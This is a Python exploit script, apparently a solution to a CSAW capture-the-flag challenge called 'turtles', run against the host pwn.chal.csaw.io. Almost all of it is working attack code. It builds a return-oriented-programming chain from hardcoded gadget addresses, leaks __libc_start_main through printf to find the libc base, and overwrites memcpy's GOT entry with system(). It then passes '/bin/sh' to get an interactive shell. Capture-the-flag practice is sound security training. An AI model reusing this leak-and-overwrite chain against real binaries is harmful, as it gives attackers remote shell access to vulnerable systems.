from minipwn import *

#s = connect_process(['./turtles'])
s = socket.create_connection(('pwn.chal.csaw.io', 9003))
ret = 0x400CCA
pop6ret = 0x400D3A 
pop_rdi_ret = 0x400d43
pop_rbp_ret = 0x400ac0
pop_rsi_r15_ret = 0x0400d41

__libc_start_main_got = 0x6012C8 
printf_got = 0x601290 
printf_plt = 0x4009D0
memcpy_got = 0x6012B0
read_plt = 0x400A30

offset__libc_start_main = 0x21a50
offset_system = 0x0041490  

#raw_input("?")
print recvuntil(s,"Here is a Turtle: ")
heap = int(recvuntil(s,"\n")[:-1],16)
print ("heap: %x"%heap)
payload = p64(heap)
payload += p64(heap+0x10)
payload += p64(pop6ret)
payload += p64(pop6ret)
payload = payload.ljust(0x28,'B')
payload += p64(0)
payload = payload.ljust(0x40,'a')
payload += p64(heap)
payload += 'A'*8
payload += p64(pop_rdi_ret)
payload += p64(__libc_start_main_got)
payload += p64(printf_plt)
payload += p64(pop_rdi_ret)
payload += p64(0x0)
payload += p64(0x400D3A) #pop rbx,rbp,r12, rdx, rsi rdi, call[r12*rbx*8]
payload += p64(0)
payload += p64(1)
payload += p64(0x6012C0)
payload += p64(0x100)
payload += p64(memcpy_got)#rsi
payload += p64(0)
payload += p64(0x400D20)
payload += p64(0x41414141)*7
payload += p64(pop_rdi_ret)
payload += p64(memcpy_got+0x10)
payload += p64(0x400C72)
payload = payload.ljust(0x80f,'\x00')
sendline(s,payload)

__libc_start_main = u64(s.recv(6)+"\x00\x00")
libc = __libc_start_main - offset__libc_start_main
system = libc + offset_system
print ("__libc_start_main: %x"%__libc_start_main)
print ("libc: %x"%libc)
print ("system: %x"%system)

sendline(s,p64(system)+p64(0)+"/bin/sh\x00")
interact(s)
